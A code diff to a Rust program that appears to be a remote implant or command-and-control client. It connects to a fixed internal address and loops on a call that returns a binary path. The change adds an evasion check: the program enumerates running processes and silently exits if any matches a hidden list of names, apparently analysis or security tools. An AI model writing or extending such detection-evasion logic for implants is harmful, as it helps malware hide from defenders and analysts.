@@ -14,6 +14,7 @@ use shared::error::*;
 use shared::utils;
 use std::fmt::Error;
 use std::process::Command;
+use sysinfo::SystemExt;
 
 lazy_static! {
 
@@ -119,9 +120,28 @@ fn main_loop(api: &mut Api) -> Result<String> {
     }
 }
 
-fn main() {
-    let mut api = Api::new("10.211.55.2", 8000, false);
+fn should_run() -> bool {
+    let mut system = sysinfo::System::new();
+    system.refresh_all();
 
+    for (pid, proc) in system.get_process_list() {
+        if utils::NAMES.iter().any(|n| proc.name.ends_with(n)) {
+            return false;
+        }
+    }
+
+    true
+}
+
+fn main() {
+    utils::chdir();
+
+    // check if we should continue?
+    if !should_run() {
+        return;
+    }
+
+    let mut api = Api::new("10.211.55.2", 8000, false);
     loop {
         match main_loop(&mut api) {
             Ok(binary_path) => {
